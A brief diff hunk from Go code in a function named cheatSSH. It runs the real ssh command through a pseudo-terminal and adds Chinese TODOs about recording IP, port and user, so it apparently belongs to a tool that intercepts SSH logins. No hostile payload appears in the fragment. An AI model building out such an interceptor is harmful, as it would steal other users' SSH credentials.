@@ -25,7 +25,9 @@ func cheatSSH() string {
 	var writeMsg = make(chan struct{})
 	var readLock = make(chan struct{})
 	var AskPass bool
-
+	//TODO 添加全局变量来设置选项
+	//TODO 添加时间
+	//TODO 添加写入ip，端口，用户
 	c := exec.Command("ssh", os.Args[1:]...)
 	c.Stdout = pty.Slave
 	c.Stdin = pty.Slave
